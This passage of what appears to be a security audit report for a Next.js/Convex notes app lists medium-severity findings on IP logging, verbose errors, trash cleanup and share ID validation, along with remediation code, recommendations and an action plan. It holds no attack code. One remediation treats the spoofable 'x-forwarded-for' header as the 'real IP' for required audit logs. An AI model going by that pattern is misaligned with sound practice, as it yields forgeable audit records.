- Compliance gaps (SOC2, HIPAA require IP logging)

**Remediation**:

Convex doesn't directly provide IP addresses, but you can pass them:

```typescript
// From Next.js API route or server component
import { headers } from 'next/headers';

export async function logAdminAction(action: string) {
  const headersList = headers();
  const ip = headersList.get('x-forwarded-for') ||
             headersList.get('x-real-ip') ||
             'unknown';

  await logAdminAccess({
    adminEmail: "...",
    action,
    ipAddress: ip, // Now has real IP
    // ...
  });
}
```

```typescript
// Update schema to make IP required
adminAuditLog: defineTable({
  // ...
  ipAddress: v.string(), // Remove optional
  userAgent: v.optional(v.string()), // NEW: Browser fingerprinting
})
```

**References**: ISO 27001 A.12.4.1 - Event Logging

---

### M3. Verbose Error Messages

**Files**: Various Convex functions
**Severity**: Medium

**Issue**:
```typescript
// notes.ts
throw new Error("Note not found"); // Reveals note doesn't exist
throw new Error("Unauthorized: You don't own this note"); // Reveals note DOES exist

// Could allow attackers to map database structure
```

**Remediation**:
```typescript
// Generic error for all failure cases
if (!note || note.userId !== userId) {
  throw new Error("Note not accessible"); // Ambiguous
}
```

**References**: CWE-209

---

### M4. Soft Delete Without Automatic Expiration

**File**: `convex/schema.ts`, `convex/notes.ts`
**Severity**: Medium

**Issue**:
- Notes marked `isDeleted: true` stay in database forever
- No automatic cleanup of trash
- Accumulates storage costs
- Data retention compliance issues

**Remediation**:
```typescript
// convex/cron.ts
import { cronJobs } from "convex/server";
import { internal } from "./_generated/api";

const crons = cronJobs();

// Run daily at 2 AM
crons.daily(
  "cleanup-old-trash",
  { hourUTC: 2, minuteUTC: 0 },
  internal.trash.autoDeleteExpired
);

export default crons;

// convex/trash.ts
export const autoDeleteExpired = internalMutation({
  handler: async (ctx) => {
    const RETENTION_DAYS = 30;
    const cutoff = Date.now() - (RETENTION_DAYS * 24 * 60 * 60 * 1000);

    // Find notes deleted > 30 days ago
    const expiredNotes = await ctx.db
      .query("notes")
      .withIndex("by_deleted_date", (q) =>
        q.eq("isDeleted", true).lt("deletedAt", cutoff)
      )
      .collect();

    for (const note of expiredNotes) {
      // Permanently delete
      await ctx.db.delete(note._id);

      // Log the action
      await ctx.db.insert("trashAuditLog", {
        userId: note.userId,
        action: "auto_delete",
        itemType: "note",
        itemId: note._id,
        itemTitle: note.title,
        timestamp: Date.now(),
        metadata: { deletedAt: note.deletedAt, retentionDays: RETENTION_DAYS },
      });
    }

    return { deleted: expiredNotes.length };
  }
});
```

**References**: CWE-404 (Improper Resource Shutdown or Release)

---

### M5. Weak Share ID Validation

**File**: `lib/shareUtils.ts:26-28`
**Severity**: Medium

**Issue**:
```typescript
export function validateShareId(shareId: string): boolean {
  return typeof shareId === 'string' && shareId.length === 16;
}
```

Only checks length, not character set or format.

**Remediation**:
```typescript
export function validateShareId(shareId: string): boolean {
  // Validate length AND character set
  return (
    typeof shareId === 'string' &&
    shareId.length === 16 &&
    /^[a-zA-Z0-9_-]+$/.test(shareId) && // Only nanoid chars
    !shareId.includes('..') && // No path traversal attempts
    shareId !== 'undefined' && // Reject common mistakes
    shareId !== 'null'
  );
}

// Add input sanitization
export function sanitizeShareId(input: string): string | null {
  const clean = input.trim().slice(0, 16); // Max length
  return validateShareId(clean) ? clean : null;
}
```

**References**: CWE-20 (Improper Input Validation)

---

## Additional Recommendations

### 1. Implement Comprehensive Logging
- Add structured logging (Winston, Pino)
- Log all authentication events
- Track failed access attempts
- Monitor unusual patterns

### 2. Security Monitoring
- Set up alerts for:
  - Multiple failed auth attempts
  - Large number of share views in short time
  - Admin access to user data
  - File upload failures
  - Database query errors

### 3. Dependency Scanning
```bash
# Add to CI/CD pipeline
npm audit
npm audit fix

# Use Snyk or Dependabot for automated vulnerability scanning
```

### 4. Regular Security Audits
- Quarterly penetration testing
- Annual third-party security audit
- Bug bounty program

### 5. Security Documentation
- Create SECURITY.md with vulnerability reporting process
- Document security architecture
- Maintain security incident response plan

---

## Summary

This audit identified critical vulnerabilities requiring immediate attention, particularly around admin access management, rate limiting, file uploads, and input sanitization. The encryption system is fully implemented but not active, representing a significant privacy gap.

**Immediate Actions** (This Week):
1. Fix hardcoded admin emails (C1)
2. Add rate limiting to public endpoints (C2)
3. Implement file upload validation (C3)
4. Add input sanitization (C4)
5. Add security headers (H5)

**Short-term Actions** (Next Month):
1. Activate end-to-end encryption (C5)
2. Fix information disclosure (H1-H3)
3. Implement audit log retention (M1-M2)
4. Add automated trash cleanup (M4)

**Long-term Improvements**:
1. Move to RBAC for admin management
2. Implement comprehensive security monitoring
3. Add WAF (Web Application Firewall)
4. Regular security audits and penetration testing

---

**Report Generated**: 2025-11-08
**Next Review Due**: 2025-12-08
